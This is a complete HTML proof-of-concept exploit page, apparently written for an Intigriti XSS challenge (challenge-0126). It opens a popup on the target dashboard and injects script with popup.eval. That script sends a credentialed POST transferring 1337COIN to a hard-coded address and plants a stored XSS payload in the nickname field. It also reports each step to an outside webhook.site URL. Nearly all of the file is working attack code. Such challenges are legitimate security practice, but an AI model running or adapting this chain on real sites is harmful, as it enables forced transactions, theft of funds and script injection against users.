<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<h1>XSS PoC - popup will open</h1>

<!-- Webhook tracking -->
<img src="https://webhook.site/f81ce1a4-789f-4cea-b6f0-034c966c4049/?step=started">

<script>
const BASE = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/f81ce1a4-789f-4cea-b6f0-034c966c4049';
const YOUR_ADDRESS = '1cc4a7735c998cb4b4e390e97c349281d2';
const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

// Open popup with exploit code
const popup = window.open(
  BASE + '/dashboard.html',
  'exploit',
  'width=500,height=500'
);

new Image().src = WEBHOOK + '/?step=popup_opened';

// Wait for popup to load, then inject exploit
setTimeout(function() {
  try {
    // Inject script into popup
    const exploit = `
      (function() {
        fetch('/api/transaction', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          credentials: 'include',
          body: JSON.stringify({
            toAddress: '${YOUR_ADDRESS}',
            currency: '1337COIN',
            amount: 1,
            nickname: '${XSS_PAYLOAD}'
          })
        }).then(r => {
          opener.location = '${BASE}/marketwatch.html';
          window.close();
        });
      })();
    `;

    popup.eval(exploit);
    new Image().src = WEBHOOK + '/?step=exploit_injected';
  } catch (e) {
    new Image().src = WEBHOOK + '/?step=error_' + encodeURIComponent(e.message);
  }
}, 2000);
</script>
</body>
</html>
